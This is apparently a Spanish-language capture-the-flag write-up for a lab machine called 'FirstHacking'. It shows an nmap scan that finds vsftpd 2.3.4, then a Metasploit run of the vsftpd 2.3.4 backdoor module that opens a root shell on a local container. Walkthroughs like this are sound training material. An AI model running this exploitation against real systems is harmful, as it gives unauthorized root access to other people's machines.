---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# FirstHacking

Con `nmap` vemos que solo está abierto el puerto 21 FTP.

```bash
❯ nmap -sC -sV $IPTARGET
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 20:12 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
```

Como no tiene acceso para `anonymous`, un posible path para resolver la máquina sería buscar la versión del FTP en `metasploit` para ver si es vulnerable.

<figure><img src="../../.gitbook/assets/Pasted image 20250722021637 (2).png" alt=""><figcaption></figcaption></figure>

Probamos este backdoor.

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
whoami
[*] Command shell session 1 opened (172.17.0.1:39081 -> 172.17.0.2:6200) at 2025-07-21 20:17:57 -0400

root
```
